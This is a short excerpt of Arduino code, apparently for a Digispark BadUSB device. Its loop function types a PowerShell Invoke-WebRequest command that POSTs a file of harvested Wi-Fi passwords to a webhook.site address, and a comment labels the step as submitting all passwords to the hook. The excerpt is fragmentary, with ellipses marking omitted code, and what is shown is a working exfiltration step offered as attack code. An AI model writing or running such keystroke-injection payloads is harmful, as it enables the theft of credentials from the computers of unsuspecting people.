...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/c9ec41db-f466-479b-9a5a-882956c0f71b -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
